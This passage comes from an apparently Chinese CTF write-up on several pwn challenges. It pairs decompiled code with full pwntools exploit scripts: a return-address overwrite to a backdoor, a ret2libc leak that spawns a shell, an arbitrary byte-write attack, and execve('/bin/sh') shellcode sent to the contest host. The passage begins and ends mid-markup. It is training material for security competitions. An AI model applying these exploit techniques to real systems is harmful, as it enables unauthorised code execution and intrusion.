BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter user name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter password:&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, password) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong password!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct password!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fgets(password, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># if(is_debug):</span></span><br><span class="line"><span class="comment">#     p = process()</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     ip = &quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line"><span class="comment">#     port = 30872</span></span><br><span class="line"><span class="comment">#     p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x00000000004012F3</span>) <span class="comment"># backdoor</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">port = <span class="number">31233</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    </span><br><span class="line">    p.sendafter(<span class="string">b&quot;name:\n&quot;</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;password:\n&quot;</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    s = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">b&quot;Correct&quot;</span> <span class="keyword">in</span> s):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    p.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>先用write泄露got表的地址，然后计算libc的基地址，拿到system和binsh后，正常的rop</p>
<p>找了半天没有找到修改rdx寄存器的gadget，后面发现这里有一个非常合适的gadget</p>
<p><img src="G:\ctf\sycctf\img\1698472420151.png" alt="1698472420151"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31982</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000401333</span></span><br><span class="line">rsi_r15 = <span class="number">0x0000000000401331</span></span><br><span class="line">csu1 = <span class="number">0x0000000000401310</span></span><br><span class="line">csu2 = <span class="number">0x0000000000401326</span></span><br><span class="line">main = <span class="number">0x000000000040126F</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">init_proc = <span class="number">0x0000000000401000</span></span><br><span class="line">rdx = <span class="number">0x0000000000401288</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,flat([</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>),</span><br><span class="line">    rsi_r15, elf.got.write, <span class="number">0</span>, rdx,</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leek_write = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&quot;success-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(leek_write)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = leek_write - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">f&quot;libc_base-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh= libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">f&quot;system-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;binsh-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(binsh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,flat([</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>),</span><br><span class="line">    rdi,binsh,system</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>看到的一种很有意思的做法，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mumuhhh/p/17860207.html">https://www.cnblogs.com/mumuhhh/p/17860207.html</a> 这里，用magic gadget，配合csu实现任意地址写，写got表，然后写one gadget的地址来getshell</p>
<h2 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h2><p>*((_BYTE *)v2 + v1) +&#x3D; tmp; 这里有一个任意地址写的漏洞，可以一个字节一个字节的修改数据，程序中有一个backdoor函数，可以把返回地址修改成backdoor然后再输入一个&lt;0的数退出循环，注意__isoc99_scanf(“%x”, &amp;tmp); 是十六进制的，所以输入也应该是十六进制的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">do_something</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  __int64 v2[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  v2[<span class="number">0</span>] = s;</span><br><span class="line">  v2[<span class="number">1</span>] = qword_404098;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;tmp);</span><br><span class="line">    *((_BYTE *)v2 + v1) += tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31253</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">       </span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-0x28&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-0x1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><p>ret2shellcode 0x13h - 0x8 &#x3D; 11个字节，这个太难受了，一开始想着把shellcode拆成两半，后半段放在开始，前半段放在后面，然后结尾jmp，第一次尝试写shellcode，写来写去最短也要22个字节，网上找了一些16字节的发现都有些问题。后面发现syscall再read再read一遍写足够大的位置不就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; Segment type: Pure code</span><br><span class="line">; Segment permissions: Read/Execute</span><br><span class="line">_text segment byte public <span class="string">&#x27;CODE&#x27;</span> use64</span><br><span class="line">assume cs:_text</span><br><span class="line">;org <span class="number">801000</span>h</span><br><span class="line">assume es:nothing, ss:nothing, ds:LOAD, fs:nothing, gs:nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; <span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">public fun</span><br><span class="line">fun proc near</span><br><span class="line"></span><br><span class="line">anonymous_0= byte ptr <span class="number">-20</span>h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     edi, edi        ; fd</span><br><span class="line">mov     rsi, rsp        ; buf</span><br><span class="line">mov     edx, <span class="number">13</span>h        ; count</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">add     rsi, <span class="number">8</span></span><br><span class="line">jmp     rsi</span><br><span class="line">; &#125; <span class="comment">// starts at 801000</span></span><br><span class="line">fun endp</span><br><span class="line"></span><br><span class="line">_text ends</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ezpwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31578</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall read</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    push 0x50</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    add rsi,11</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + asm(shellcode1)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(shellcode1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode2 = asm(shellcraft.sh())</span></span><br><span class="line">shellcode2 = asm(shellcode2)</span><br><span class="line"></span><br><span class="line">s(shellcode2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h2><p>vmmap 发现栈上有可执行的权限，任意地址写，直接往rbp + 16写shellcode，然后把rbp + 8改成rbp + 16的地址就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./write2&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">30602</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span 